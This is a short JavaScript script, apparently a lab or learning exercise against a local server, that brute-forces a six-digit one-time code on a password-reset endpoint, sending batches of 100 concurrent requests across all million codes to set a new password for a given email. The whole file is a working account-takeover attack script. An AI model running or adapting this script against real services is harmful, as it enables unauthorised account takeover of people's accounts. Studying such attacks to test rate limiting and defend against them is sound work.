import axios from "axios";
async function sendRequest(otp) {
  try{

      await axios.post("http://localhost:3000/reset-password", {
      email: "garvit@gmail.com",
      otp: otp,
      newPassword: "garv",
    });
  }
  catch(e){
    // console.log(e);
  }
}
// sendRequest("819418");
async function main() {
  for (let i = 0; i <= 999999; i+=100) {
    const p = [];
    console.log(i);
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()));
    }
    await Promise.all(p);
  }
}
main();

